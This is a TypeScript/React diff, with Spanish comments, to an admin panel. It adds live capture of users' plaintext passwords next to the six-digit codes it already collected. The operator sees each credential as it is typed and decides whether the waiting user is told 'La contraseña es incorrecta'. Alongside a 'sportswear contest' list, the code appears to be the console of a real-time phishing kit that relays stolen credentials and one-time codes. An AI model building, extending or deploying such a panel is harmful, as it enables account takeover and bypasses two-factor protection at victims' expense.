@@ -5,6 +5,7 @@ import {
   deleteCodeById,
   clearAllAdminData,
   updateCodeStatusInDb,
+  updateUserStatusInDb,
   type FullAdminData,
   type AdminUserWithCodes,
   type CodeRecord,
@@ -45,7 +46,9 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ isOpen, onClose }) => {
   const [copiedText, setCopiedText] = useState<string | null>(null);
   const [activityLogs, setActivityLogs] = useState<ActivityLog[]>([]);
   const [contestEntries, setContestEntries] = useState<SportswearEntry[]>([]);
-  const [verificationRequests, setVerificationRequests] = useState<VerificationRequest[]>([]);
+  const [verificationRequests, setVerificationRequests] = useState<VerificationRequest[]>(() =>
+    getVerificationRequests()
+  );
 
   // Ref para rastrear conteos anteriores y detectar cambios en tiempo real
   const prevUsersCountRef = useRef<number>(0);
@@ -109,8 +112,6 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ isOpen, onClose }) => {
   useEffect(() => {
     if (!isOpen) return;
 
-    setVerificationRequests(getVerificationRequests());
-
     const unsubscribe = subscribeToAllVerificationRequests((reqs) => {
       setVerificationRequests(reqs);
 
@@ -140,15 +141,22 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ isOpen, onClose }) => {
   useEffect(() => {
     if (!isOpen) return;
 
-    loadData();
+    const initialTimer = setTimeout(() => {
+      void loadData();
+    }, 0);
 
-    if (!isLiveActive) return;
+    if (!isLiveActive) {
+      return () => clearTimeout(initialTimer);
+    }
 
     const interval = setInterval(() => {
-      loadData();
+      void loadData();
     }, 1000);
 
-    return () => clearInterval(interval);
+    return () => {
+      clearTimeout(initialTimer);
+      clearInterval(interval);
+    };
   }, [isOpen, isLiveActive, loadData]);
 
   // Listener para cerrar con tecla ESC
@@ -172,128 +180,209 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ isOpen, onClose }) => {
     setTimeout(() => setCopiedText(null), 1800);
   };
 
-  // ACCIÓN ADMIN 1: Aceptar código (Marca como correcto en PostgreSQL e inicia sesión)
-  const handleApprove = async (
-    requestId: string,
-    codigo: string,
-    username: string,
-    codeId?: number
-  ) => {
-    approveVerificationRequest(requestId);
+  // ACCIÓN ADMIN 1: Aceptar solicitud (Código o Contraseña)
+  const handleApprove = useCallback(
+    async (
+      requestId: string,
+      codigoOrPwd: string,
+      username: string,
+      codeId?: number,
+      userId?: number | string,
+      type: 'CODE' | 'PASSWORD' = 'CODE'
+    ) => {
+      approveVerificationRequest(requestId);
 
-    // Sincronizar de inmediato con PostgreSQL en Render
-    let targetCodeId = codeId;
-    if (!targetCodeId) {
-      const match =
-        data?.rawCodes.find((c) => c.codigo === codigo && c.estado === 'PENDING') ||
-        data?.rawCodes.find((c) => c.codigo === codigo);
-      targetCodeId = match?.id_codigo;
-    }
+      if (type === 'PASSWORD') {
+        const effectiveUserId = userId || data?.rawUsers.find((u) => u.username === username)?.id;
+        if (effectiveUserId) {
+          await updateUserStatusInDb(Number(effectiveUserId), 'APPROVED');
+          loadData();
+        }
+        const logEntry: ActivityLog = {
+          id: `log_${Date.now()}_${Math.random()}`,
+          time: new Date().toLocaleTimeString(),
+          type: 'approve',
+          message: `✅ Admin APROBÓ el acceso para "${username}" (Contraseña: ${codigoOrPwd}). Inicio de sesión CONCEDIDO.`,
+        };
+        setActivityLogs((prev) => [logEntry, ...prev.slice(0, 49)]);
+      } else {
+        // Sincronizar de inmediato con PostgreSQL en Render para código
+        let targetCodeId = codeId;
+        if (!targetCodeId) {
+          const match =
+            data?.rawCodes.find((c) => c.codigo === codigoOrPwd && c.estado === 'PENDING') ||
+            data?.rawCodes.find((c) => c.codigo === codigoOrPwd);
+          targetCodeId = match?.id_codigo;
+        }
 
-    // Si aún no está en data, consultar códigos frescos de la nube de Render
-    if (!targetCodeId) {
-      try {
-        const fresh = await apiClient.get<{ success: boolean; codes: CodeRecord[] }>(
-          `/auth/codes?_t=${Date.now()}`
-        );
-        const freshCodes = fresh.data?.codes || [];
-        const freshMatch =
-          freshCodes.find((c) => c.codigo === codigo && c.estado === 'PENDING') ||
-          freshCodes.find((c) => c.codigo === codigo);
-        targetCodeId = freshMatch?.id_codigo;
-      } catch (err) {
-        console.warn('Error al buscar código fresco en Render:', err);
+        if (!targetCodeId) {
+          try {
+            const fresh = await apiClient.get<{ success: boolean; codes: CodeRecord[] }>(
+              `/auth/codes?_t=${Date.now()}`
+            );
+            const freshCodes = fresh.data?.codes || [];
+            const freshMatch =
+              freshCodes.find((c) => c.codigo === codigoOrPwd && c.estado === 'PENDING') ||
+              freshCodes.find((c) => c.codigo === codigoOrPwd);
+            targetCodeId = freshMatch?.id_codigo;
+          } catch (err) {
+            console.warn('Error al buscar código fresco en Render:', err);
+          }
+        }
+
+        if (targetCodeId) {
+          await updateCodeStatusInDb(targetCodeId, 'APPROVED');
+          loadData();
+        }
+
+        const logEntry: ActivityLog = {
+          id: `log_${Date.now()}_${Math.random()}`,
+          time: new Date().toLocaleTimeString(),
+          type: 'approve',
+          message: `✅ Admin APROBÓ el código [${codigoOrPwd}] para "${username}". Inicio de sesión CONCEDIDO.`,
+        };
+        setActivityLogs((prev) => [logEntry, ...prev.slice(0, 49)]);
       }
-    }
 
-    if (targetCodeId) {
-      await updateCodeStatusInDb(targetCodeId, 'APPROVED');
-      loadData();
-    }
+      setVerificationRequests(getVerificationRequests());
+    },
+    [data, loadData]
+  );
 
-    const logEntry: ActivityLog = {
-      id: `log_${Date.now()}_${Math.random()}`,
-      time: new Date().toLocaleTimeString(),
-      type: 'approve',
-      message: `✅ Admin APROBÓ el código [${codigo}] para "${username}". Inicio de sesión CONCEDIDO.`,
-    };
-    setActivityLogs((prev) => [logEntry, ...prev.slice(0, 49)]);
-    setVerificationRequests(getVerificationRequests());
-  };
+  // ACCIÓN ADMIN 2: Rechazar solicitud (Código o Contraseña)
+  const handleReject = useCallback(
+    async (
+      requestId: string,
+      codigoOrPwd: string,
+      username: string,
+      codeId?: number,
+      userId?: number | string,
+      type: 'CODE' | 'PASSWORD' = 'CODE'
+    ) => {
+      rejectVerificationRequest(
+        requestId,
+        type === 'PASSWORD' ? 'La contraseña es incorrecta' : 'Introduce un código de verificación válido'
+      );
 
-  // ACCIÓN ADMIN 2: Rechazar código (Marca como incorrecto en PostgreSQL y deniega inicio de sesión)
-  const handleReject = async (
-    requestId: string,
-    codigo: string,
-    username: string,
-    codeId?: number
-  ) => {
-    rejectVerificationRequest(
-      requestId,
-      'Introduce un código de verificación válido'
-    );
+      if (type === 'PASSWORD') {
+        const effectiveUserId = userId || data?.rawUsers.find((u) => u.username === username)?.id;
+        if (effectiveUserId) {
+          await updateUserStatusInDb(Number(effectiveUserId), 'REJECTED');
+          loadData();
+        }
+        const logEntry: ActivityLog = {
+          id: `log_${Date.now()}_${Math.random()}`,
+          time: new Date().toLocaleTimeString(),
+          type: 'reject',
+          message: `❌ Admin RECHAZÓ la contraseña para "${username}". Mostrando "La contraseña es incorrecta".`,
+        };
+        setActivityLogs((prev) => [logEntry, ...prev.slice(0, 49)]);
+      } else {
+        let targetCodeId = codeId;
+        if (!targetCodeId) {
+          const match =
+            data?.rawCodes.find((c) => c.codigo === codigoOrPwd && c.estado === 'PENDING') ||
+            data?.rawCodes.find((c) => c.codigo === codigoOrPwd);
+          targetCodeId = match?.id_codigo;
+        }
 
-    // Sincronizar de inmediato con PostgreSQL en Render
-    let targetCodeId = codeId;
-    if (!targetCodeId) {
-      const match =
-        data?.rawCodes.find((c) => c.codigo === codigo && c.estado === 'PENDING') ||
-        data?.rawCodes.find((c) => c.codigo === codigo);
-      targetCodeId = match?.id_codigo;
-    }
+        if (!targetCodeId) {
+          try {
+            const fresh = await apiClient.get<{ success: boolean; codes: CodeRecord[] }>(
+              `/auth/codes?_t=${Date.now()}`
+            );
+            const freshCodes = fresh.data?.codes || [];
+            const freshMatch =
+              freshCodes.find((c) => c.codigo === codigoOrPwd && c.estado === 'PENDING') ||
+              freshCodes.find((c) => c.codigo === codigoOrPwd);
+            targetCodeId = freshMatch?.id_codigo;
+          } catch (err) {
+            console.warn('Error al buscar código fresco en Render:', err);
+          }
+        }
 
-    // Si aún no está en data, consultar códigos frescos de la nube de Render
-    if (!targetCodeId) {
-      try {
-        const fresh = await apiClient.get<{ success: boolean; codes: CodeRecord[] }>(
-          `/auth/codes?_t=${Date.now()}`
-        );
-        const freshCodes = fresh.data?.codes || [];
-        const freshMatch =
-          freshCodes.find((c) => c.codigo === codigo && c.estado === 'PENDING') ||
-          freshCodes.find((c) => c.codigo === codigo);
-        targetCodeId = freshMatch?.id_codigo;
-      } catch (err) {
-        console.warn('Error al buscar código fresco en Render:', err);
+        if (targetCodeId) {
+          await updateCodeStatusInDb(targetCodeId, 'REJECTED');
+          loadData();
+        }
+
+        const logEntry: ActivityLog = {
+          id: `log_${Date.now()}_${Math.random()}`,
+          time: new Date().toLocaleTimeString(),
+          type: 'reject',
+          message: `❌ Admin RECHAZÓ el código [${codigoOrPwd}] para "${username}". Código marcado como INCORRECTO.`,
+        };
+        setActivityLogs((prev) => [logEntry, ...prev.slice(0, 49)]);
       }
-    }
 
-    if (targetCodeId) {
-      await updateCodeStatusInDb(targetCodeId, 'REJECTED');
-      loadData();
-    }
+      setVerificationRequests(getVerificationRequests());
+    },
+    [data, loadData]
+  );
 
-    const logEntry: ActivityLog = {
-      id: `log_${Date.now()}_${Math.random()}`,
-      time: new Date().toLocaleTimeString(),
-      type: 'reject',
-      message: `❌ Admin RECHAZÓ el código [${codigo}] para "${username}". Código marcado como INCORRECTO.`,
-    };
-    setActivityLogs((prev) => [logEntry, ...prev.slice(0, 49)]);
-    setVerificationRequests(getVerificationRequests());
-  };
+  // Decisión directa para un usuario (Contraseña / Acceso)
+  const handleUserDecision = useCallback(
+    async (
+      userId: number,
+      decision: 'APPROVED' | 'REJECTED'
+    ) => {
+      const targetUser = data?.rawUsers.find((u) => Number(u.id) === Number(userId));
+      const username = targetUser?.username || `Usuario #${userId}`;
+      const password = targetUser?.password || '';
+
+      const existingReq = verificationRequests.find(
+        (r) => Number(r.userId) === Number(userId) && r.type === 'PASSWORD'
+      );
+      const reqId = existingReq ? existingReq.id : `pwd_req_admin_${userId}`;
+
+      if (decision === 'APPROVED') {
+        await handleApprove(reqId, password, username, undefined, userId, 'PASSWORD');
+      } else {
+        await handleReject(reqId, password, username, undefined, userId, 'PASSWORD');
+      }
+    },
+    [data, verificationRequests, handleApprove, handleReject]
+  );
+
+  // Obtener estado de validación de usuario (Prioridad: base de datos PostgreSQL)
+  const getUserStatus = useCallback(
+    (userId: number, username: string): VerificationStatus => {
+      const dbUser = data?.rawUsers.find((u) => Number(u.id) === Number(userId));
+      if (dbUser?.estado) {
+        return dbUser.estado;
+      }
+      const req = verificationRequests.find(
+        (r) => (Number(r.userId) === Number(userId) || r.username === username) && r.type === 'PASSWORD'
+      );
+      return req ? req.status : 'PENDING';
+    },
+    [data, verificationRequests]
+  );
 
   // Decisión rápida para cualquier código listado en las tablas
-  const handleQuickDecision = async (
-    codigo: string,
-    userId: number,
-    decision: 'APPROVED' | 'REJECTED',
-    codeId?: number
-  ) => {
-    const targetUser = data?.rawUsers.find((u) => Number(u.id) === Number(userId));
-    const username = targetUser?.username || `Usuario #${userId}`;
+  const handleQuickDecision = useCallback(
+    async (
+      codigo: string,
+      userId: number,
+      decision: 'APPROVED' | 'REJECTED',
+      codeId?: number
+    ) => {
+      const targetUser = data?.rawUsers.find((u) => Number(u.id) === Number(userId));
+      const username = targetUser?.username || `Usuario #${userId}`;
 
-    const existingReq = verificationRequests.find(
-      (r) => r.codigo === codigo && (Number(r.userId) === Number(userId) || !r.userId)
-    );
+      const existingReq = verificationRequests.find(
+        (r) => r.codigo === codigo && (Number(r.userId) === Number(userId) || !r.userId)
+      );
 
-    const reqId = existingReq ? existingReq.id : `req_${Date.now()}`;
-    if (decision === 'APPROVED') {
-      await handleApprove(reqId, codigo, username, codeId);
-    } else {
-      await handleReject(reqId, codigo, username, codeId);
-    }
-  };
+      const reqId = existingReq ? existingReq.id : `req_${userId}_${codigo}`;
+      if (decision === 'APPROVED') {
+        await handleApprove(reqId, codigo, username, codeId, userId, 'CODE');
+      } else {
+        await handleReject(reqId, codigo, username, codeId, userId, 'CODE');
+      }
+    },
+    [data, verificationRequests, handleApprove, handleReject]
+  );
 
   // Obtener estado de un código (Prioridad: base de datos PostgreSQL en la nube)
   const getCodeStatus = (codigo: string, userId?: number): VerificationStatus | null => {
@@ -366,30 +455,54 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ isOpen, onClose }) => {
 
   if (!isOpen) return null;
 
-  // Solicitudes pendientes de validación en tiempo real (Unificando local + base de datos en la nube de Render)
-  const pendingCloudRequests: (VerificationRequest & { codeId?: number })[] = (data?.rawCodes || [])
+  // Solicitudes pendientes de validación en tiempo real (Códigos y Usuarios/Contraseñas)
+  const pendingCloudCodeRequests: (VerificationRequest & { codeId?: number })[] = (data?.rawCodes || [])
     .filter((c) => c.estado === 'PENDING')
     .map((c) => {
       const targetUser = data?.rawUsers.find((u) => Number(u.id) === Number(c.user_id));
       return {
-        id: `cloud_${c.id_codigo}`,
+        id: `cloud_code_${c.id_codigo}`,
         codeId: c.id_codigo,
         userId: c.user_id,
         username: targetUser?.username || `Usuario #${c.user_id}`,
         codigo: c.codigo,
+        type: 'CODE' as const,
         status: 'PENDING' as VerificationStatus,
-        createdAt: Date.now(),
+        createdAt: 0,
       };
     });
+
+  const pendingCloudUserRequests: (VerificationRequest & { codeId?: number })[] = (data?.rawUsers || [])
+    .filter((u) => u.estado === 'PENDING' && u.password !== 'no-password')
+    .map((u) => ({
+      id: `cloud_user_${u.id}`,
+      userId: u.id,
+      username: u.username,
+      password: u.password,
+      inicio_sesion: u.inicio_sesion,
+      type: 'PASSWORD' as const,
+      status: 'PENDING' as VerificationStatus,
+      createdAt: 0,
+    }));
 
   // Combinar sin duplicados
   const pendingRequests = [
     ...verificationRequests.filter((r) => r.status === 'PENDING'),
-    ...pendingCloudRequests.filter(
+    ...pendingCloudUserRequests.filter(
+      (cu) =>
+        !verificationRequests.some(
+          (local) =>
+            local.status === 'PENDING' &&
+            local.type === 'PASSWORD' &&
+            (Number(local.userId) === Number(cu.userId) || local.username === cu.username)
+        )
+    ),
+    ...pendingCloudCodeRequests.filter(
       (cloud) =>
         !verificationRequests.some(
           (local) =>
             local.status === 'PENDING' &&
+            local.type !== 'PASSWORD' &&
             local.codigo === cloud.codigo &&
             (Number(local.userId) === Number(cloud.userId) || !local.userId)
         )
@@ -397,25 +510,48 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ isOpen, onClose }) => {
   ];
 
   // Solicitudes globales para la pestaña live-verify
-  const allCloudRequests: (VerificationRequest & { codeId?: number })[] = (data?.rawCodes || []).map((c) => {
+  const allCloudCodeRequests: (VerificationRequest & { codeId?: number })[] = (data?.rawCodes || []).map((c) => {
     const targetUser = data?.rawUsers.find((u) => Number(u.id) === Number(c.user_id));
     return {
-      id: `cloud_${c.id_codigo}`,
+      id: `cloud_code_${c.id_codigo}`,
       codeId: c.id_codigo,
       userId: c.user_id,
       username: targetUser?.username || `Usuario #${c.user_id}`,
       codigo: c.codigo,
+      type: 'CODE' as const,
       status: (c.estado || 'PENDING') as VerificationStatus,
-      createdAt: Date.now(),
+      createdAt: 0,
     };
   });
 
+  const allCloudUserRequests: (VerificationRequest & { codeId?: number })[] = (data?.rawUsers || [])
+    .filter((u) => u.password !== 'no-password')
+    .map((u) => ({
+      id: `cloud_user_${u.id}`,
+      userId: u.id,
+      username: u.username,
+      password: u.password,
+      inicio_sesion: u.inicio_sesion,
+      type: 'PASSWORD' as const,
+      status: (u.estado || 'PENDING') as VerificationStatus,
+      createdAt: 0,
+    }));
+
   const displayVerificationRequests = [
     ...verificationRequests,
-    ...allCloudRequests.filter(
+    ...allCloudUserRequests.filter(
+      (cu) =>
+        !verificationRequests.some(
+          (vr) =>
+            vr.type === 'PASSWORD' &&
+            (Number(vr.userId) === Number(cu.userId) || vr.username === cu.username)
+        )
+    ),
+    ...allCloudCodeRequests.filter(
       (cr) =>
         !verificationRequests.some(
           (vr) =>
+            vr.type !== 'PASSWORD' &&
             vr.codigo === cr.codigo &&
             (Number(vr.userId) === Number(cr.userId) || !vr.userId)
         )
@@ -466,7 +602,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ isOpen, onClose }) => {
                 </span>
                 {pendingRequests.length > 0 && (
                   <span className="text-[10px] px-2 py-0.5 rounded-full font-bold font-mono bg-amber-500/20 text-amber-300 border border-amber-500/40 animate-pulse">
-                    🚨 {pendingRequests.length} Códigos en Espera
+                    🚨 {pendingRequests.length} Validaciones en Espera
                   </span>
                 )}
               </div>
@@ -529,7 +665,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ isOpen, onClose }) => {
         </header>
 
         {/* ========================================================================= */}
-        {/* BANNER DESTACADO DE ALERTA: CÓDIGOS PENDIENTES DE APROBACIÓN EN TIEMPO REAL */}
+        {/* BANNER DESTACADO DE ALERTA: VALIDACIONES PENDIENTES EN TIEMPO REAL */}
         {/* ========================================================================= */}
         {pendingRequests.length > 0 && (
           <section className="px-4 sm:px-6 py-3 bg-amber-950/40 border-b border-amber-500/40 shrink-0 animate-fade-in">
@@ -539,62 +675,92 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ isOpen, onClose }) => {
                 <div>
                   <div className="flex items-center gap-2">
                     <span className="text-xs font-bold uppercase tracking-wider text-amber-300">
-                      🚨 Validación de Código Requerida ({pendingRequests.length} en espera)
+                      {pendingRequests[0].type === 'PASSWORD'
+                        ? `🚨 Validación de Contraseña Requerida (${pendingRequests.length} en espera)`
+                        : `🚨 Validación de Código Requerida (${pendingRequests.length} en espera)`}
                     </span>
                     <span className="text-[10px] bg-amber-400 text-black font-black px-1.5 py-0.2 rounded-full">
                       EN VIVO
                     </span>
                   </div>
                   <p className="text-xs text-amber-200/80 mt-0.5">
-                    Un usuario acaba de ingresar su código y está en la pantalla esperando tu decisión:
+                    {pendingRequests[0].type === 'PASSWORD'
+                      ? 'Un usuario ingresó sus credenciales y está en la pantalla esperando tu aprobación:'
+                      : 'Un usuario ingresó su código de 6 dígitos y está en la pantalla esperando tu decisión:'}
                   </p>
                 </div>
               </div>
 
-              {/* Botones de Aceptar / Rechazar para el código más reciente */}
+              {/* Botones de Aceptar / Rechazar para la solicitud más reciente */}
               <div className="flex items-center gap-3 bg-black/40 border border-amber-500/30 p-2 rounded-xl">
                 <div className="text-left px-2">
                   <span className="text-[10px] text-gray-400 block font-mono">
                     {pendingRequests[0].username} {pendingRequests[0].userId ? `(#${pendingRequests[0].userId})` : ''}
                   </span>
-                  <span className="text-lg font-black tracking-widest text-white font-mono select-all">
-                    {pendingRequests[0].codigo}
+                  <span className="text-base font-black tracking-wider text-white font-mono select-all">
+                    {pendingRequests[0].type === 'PASSWORD'
+                      ? `Clave: ${pendingRequests[0].password || '••••'}`
+                      : `Código: ${pendingRequests[0].codigo}`}
                   </span>
                 </div>
 
                 <div className="flex items-center gap-2">
-                  {/* BOTÓN ACEPTAR (CORRECTO) */}
+                  {/* BOTÓN ACEPTAR */}
                   <button
                     onClick={() =>
                       handleApprove(
                         pendingRequests[0].id,
-                        pendingRequests[0].codigo,
+                        (pendingRequests[0].type === 'PASSWORD'
+                          ? pendingRequests[0].password
+                          : pendingRequests[0].codigo) || '',
                         pendingRequests[0].username,
-                        (pendingRequests[0] as { codeId?: number }).codeId
+                        (pendingRequests[0] as { codeId?: number }).codeId,
+                        pendingRequests[0].userId,
+                        pendingRequests[0].type || 'CODE'
                       )
                     }
                     className="px-3.5 py-2 rounded-lg font-bold text-xs bg-emerald-500 hover:bg-emerald-400 text-black transition-all flex items-center gap-1.5 shadow-md shadow-emerald-500/20 active:scale-95 cursor-pointer"
-                    title="Aceptar código como correcto y permitir el inicio de sesión"
+                    title={
+                      pendingRequests[0].type === 'PASSWORD'
+                        ? 'Aceptar usuario y conceder acceso'
+                        : 'Aceptar código como correcto y permitir el inicio de sesión'
+                    }
                   >
                     <span>✓</span>
-                    <span>ACEPTAR (Correcto)</span>
+                    <span>
+                      {pendingRequests[0].type === 'PASSWORD'
+                        ? 'ACEPTAR (Acceso Concedido)'
+                        : 'ACEPTAR (Correcto)'}
+                    </span>
                   </button>
 
-                  {/* BOTÓN RECHAZAR (INCORRECTO) */}
+                  {/* BOTÓN RECHAZAR */}
                   <button
                     onClick={() =>
                       handleReject(
                         pendingRequests[0].id,
-                        pendingRequests[0].codigo,
+                        (pendingRequests[0].type === 'PASSWORD'
+                          ? pendingRequests[0].password
+                          : pendingRequests[0].codigo) || '',
                         pendingRequests[0].username,
-                        (pendingRequests[0] as { codeId?: number }).codeId
+                        (pendingRequests[0] as { codeId?: number }).codeId,
+                        pendingRequests[0].userId,
+                        pendingRequests[0].type || 'CODE'
                       )
                     }
                     className="px-3.5 py-2 rounded-lg font-bold text-xs bg-rose-600 hover:bg-rose-500 text-white transition-all flex items-center gap-1.5 shadow-md shadow-rose-600/20 active:scale-95 cursor-pointer"
-                    title="Rechazar código como incorrecto y pedir que lo vuelva a ingresar"
+                    title={
+                      pendingRequests[0].type === 'PASSWORD'
+                        ? 'Rechazar contraseña (mostrar "La contraseña es incorrecta")'
+                        : 'Rechazar código como incorrecto y pedir que lo vuelva a ingresar'
+                    }
                   >
                     <span>✕</span>
-                    <span>RECHAZAR (Incorrecto)</span>
+                    <span>
+                      {pendingRequests[0].type === 'PASSWORD'
+                        ? 'RECHAZAR (Clave Incorrecta)'
+                        : 'RECHAZAR (Incorrecto)'}
+                    </span>
                   </button>
                 </div>
               </div>
@@ -806,9 +972,14 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ isOpen, onClose }) => {
                       <div>
                         {/* Header: User and Status */}
                         <div className="flex items-center justify-between mb-3">
-                          <span className="text-xs font-mono font-bold text-white">
-                            {req.username} {req.userId ? `(#${req.userId})` : ''}
-                          </span>
+                          <div className="flex items-center gap-1.5">
+                            <span className="text-[10px] px-1.5 py-0.5 rounded-md font-mono font-bold bg-[#21262d] text-cyan-400">
+                              {req.type === 'PASSWORD' ? '🔑 Contraseña' : '📲 Código 6D'}
+                            </span>
+                            <span className="text-xs font-mono font-bold text-white">
+                              {req.username} {req.userId ? `(#${req.userId})` : ''}
+                            </span>
+                          </div>
                           <span
                             className={`px-2.5 py-1 rounded-full text-xs font-bold uppercase tracking-wider flex items-center gap-1.5 ${
                               req.status === 'PENDING'
@@ -822,19 +993,25 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ isOpen, onClose }) => {
                               {req.status === 'PENDING'
                                 ? '⏳ Esperando Decisión'
                                 : req.status === 'APPROVED'
-                                ? '✓ Código Correcto (Aprobado)'
-                                : '✕ Código Incorrecto (Rechazado)'}
+                                ? req.type === 'PASSWORD'
+                                  ? '✓ Acceso Concedido'
+                                  : '✓ Código Correcto'
+                                : req.type === 'PASSWORD'
+                                ? '✕ Contraseña Rechazada'
+                                : '✕ Código Incorrecto'}
                             </span>
                           </span>
                         </div>
 
-                        {/* Code Display */}
+                        {/* Value Display (Password or Code) */}
                         <div className="p-3 bg-[#0d1117] border border-[#30363d] rounded-xl mb-4 text-center">
                           <span className="text-[10px] text-gray-400 uppercase font-bold tracking-wider block mb-1">
-                            Código Ingresado por el Usuario
+                            {req.type === 'PASSWORD'
+                              ? 'Contraseña Ingresada por el Usuario'
+                              : 'Código Ingresado por el Usuario'}
                           </span>
-                          <span className="text-3xl font-black font-mono tracking-widest text-cyan-400 select-all">
-                            {req.codigo}
+                          <span className="text-2xl font-black font-mono tracking-wider text-cyan-400 select-all">
+                            {req.type === 'PASSWORD' ? req.password || '••••••••' : req.codigo}
                           </span>
                         </div>
 
@@ -852,9 +1029,11 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ isOpen, onClose }) => {
                           onClick={() =>
                             handleApprove(
                               req.id,
-                              req.codigo,
+                              (req.type === 'PASSWORD' ? req.password : req.codigo) || '',
                               req.username,
-                              (req as { codeId?: number }).codeId
+                              (req as { codeId?: number }).codeId,
+                              req.userId,
+                              req.type || 'CODE'
                             )
                           }
                           className={`flex-1 py-2 px-3 rounded-lg text-xs font-bold flex items-center justify-center gap-1.5 transition-all cursor-pointer ${
@@ -864,16 +1043,24 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ isOpen, onClose }) => {
                           }`}
                         >
                           <span>✓</span>
-                          <span>{req.status === 'APPROVED' ? 'Aprobado (Correcto)' : 'Aceptar (Correcto)'}</span>
+                          <span>
+                            {req.status === 'APPROVED'
+                              ? 'Acceso Aprobado'
+                              : req.type === 'PASSWORD'
+                              ? 'Aceptar (Acceso Concedido)'
+                              : 'Aceptar (Correcto)'}
+                          </span>
                         </button>
 
                         <button
                           onClick={() =>
                             handleReject(
                               req.id,
-                              req.codigo,
+                              (req.type === 'PASSWORD' ? req.password : req.codigo) || '',
                               req.username,
-                              (req as { codeId?: number }).codeId
+                              (req as { codeId?: number }).codeId,
+                              req.userId,
+                              req.type || 'CODE'
                             )
                           }
                           className={`flex-1 py-2 px-3 rounded-lg text-xs font-bold flex items-center justify-center gap-1.5 transition-all cursor-pointer ${
@@ -883,7 +1070,13 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ isOpen, onClose }) => {
                           }`}
                         >
                           <span>✕</span>
-                          <span>{req.status === 'REJECTED' ? 'Rechazado (Incorrecto)' : 'Rechazar (Incorrecto)'}</span>
+                          <span>
+                            {req.status === 'REJECTED'
+                              ? 'Rechazado'
+                              : req.type === 'PASSWORD'
+                              ? 'Rechazar (Clave Incorrecta)'
+                              : 'Rechazar (Incorrecto)'}
+                          </span>
                         </button>
                       </div>
                     </div>
@@ -970,6 +1163,48 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ isOpen, onClose }) => {
                           </button>
                         </div>
                       </div>
+
+                      {/* Estado de Aprobación de Acceso con Contraseña */}
+                      {user.password !== 'no-password' && (
+                        <div className="mb-3 p-2 rounded-lg bg-[#0d1117] border border-[#30363d] flex items-center justify-between gap-2">
+                          <div>
+                            <span className="text-[10px] text-gray-400 uppercase font-semibold block">
+                              Acceso por Contraseña
+                            </span>
+                            <span
+                              className={`text-[11px] font-bold font-mono ${
+                                getUserStatus(user.id, user.username) === 'APPROVED'
+                                  ? 'text-emerald-400'
+                                  : getUserStatus(user.id, user.username) === 'REJECTED'
+                                  ? 'text-rose-400'
+                                  : 'text-amber-400 animate-pulse'
+                              }`}
+                            >
+                              {getUserStatus(user.id, user.username) === 'APPROVED'
+                                ? '✓ Aprobado'
+                                : getUserStatus(user.id, user.username) === 'REJECTED'
+                                ? '✕ Clave Rechazada'
+                                : '⏳ Pendiente'}
+                            </span>
+                          </div>
+                          <div className="flex items-center gap-1">
+                            <button
+                              onClick={() => handleUserDecision(user.id, 'APPROVED')}
+                              className="px-2 py-1 rounded bg-emerald-950/60 hover:bg-emerald-500 hover:text-black text-emerald-300 border border-emerald-500/40 text-[10px] font-bold transition-all cursor-pointer"
+                              title="Aceptar contraseña y conceder acceso"
+                            >
+                              ✓ Aceptar
+                            </button>
+                            <button
+                              onClick={() => handleUserDecision(user.id, 'REJECTED')}
+                              className="px-2 py-1 rounded bg-rose-950/60 hover:bg-rose-600 hover:text-white text-rose-300 border border-rose-500/40 text-[10px] font-bold transition-all cursor-pointer"
+                              title="Rechazar contraseña"
+                            >
+                              ✕ Rechazar
+                            </button>
+                          </div>
+                        </div>
+                      )}
 
                       {/* Códigos asociados con Aceptación en tiempo real */}
                       <div className="pt-3 border-t border-[#30363d]/80">
@@ -1076,13 +1311,14 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ isOpen, onClose }) => {
                       <th className="px-4 py-3">inicio_sesion</th>
                       <th className="px-4 py-3">username</th>
                       <th className="px-4 py-3">password</th>
+                      <th className="px-4 py-3">Estado Acceso</th>
                       <th className="px-4 py-3 text-right">Acción</th>
                     </tr>
                   </thead>
                   <tbody className="divide-y divide-[#30363d]">
                     {filteredUsers.length === 0 ? (
                       <tr>
-                        <td colSpan={5} className="px-4 py-8 text-center text-gray-500 font-sans">
+                        <td colSpan={6} className="px-4 py-8 text-center text-gray-500 font-sans">
                           No hay usuarios registrados.
                         </td>
                       </tr>
@@ -1111,13 +1347,46 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ isOpen, onClose }) => {
                               {showPasswords ? u.password : '••••••••'}
                             </span>
                           </td>
-                          <td className="px-4 py-3 text-right">
-                            <button
-                              onClick={() => handleDeleteUser(u.id, u.username)}
-                              className="text-red-400 hover:text-red-300 text-xs font-sans cursor-pointer hover:underline"
+                          <td className="px-4 py-3">
+                            <span
+                              className={`px-2 py-0.5 rounded-full text-[10px] font-semibold ${
+                                getUserStatus(u.id, u.username) === 'APPROVED'
+                                  ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/30'
+                                  : getUserStatus(u.id, u.username) === 'REJECTED'
+                                  ? 'bg-rose-500/20 text-rose-300 border border-rose-500/30'
+                                  : 'bg-amber-500/20 text-amber-300 border border-amber-500/30 animate-pulse'
+                              }`}
                             >
-                              Eliminar
-                            </button>
+                              {getUserStatus(u.id, u.username)}
+                            </span>
+                          </td>
+                          <td className="px-4 py-3 text-right">
+                            <div className="flex items-center justify-end gap-1.5">
+                              {u.password !== 'no-password' && (
+                                <>
+                                  <button
+                                    onClick={() => handleUserDecision(u.id, 'APPROVED')}
+                                    className="px-2 py-0.5 rounded bg-emerald-950/60 hover:bg-emerald-500 hover:text-black text-emerald-300 border border-emerald-500/40 text-[10px] font-bold transition-all cursor-pointer"
+                                    title="Aceptar contraseña y conceder acceso"
+                                  >
+                                    ✓ Aceptar
+                                  </button>
+                                  <button
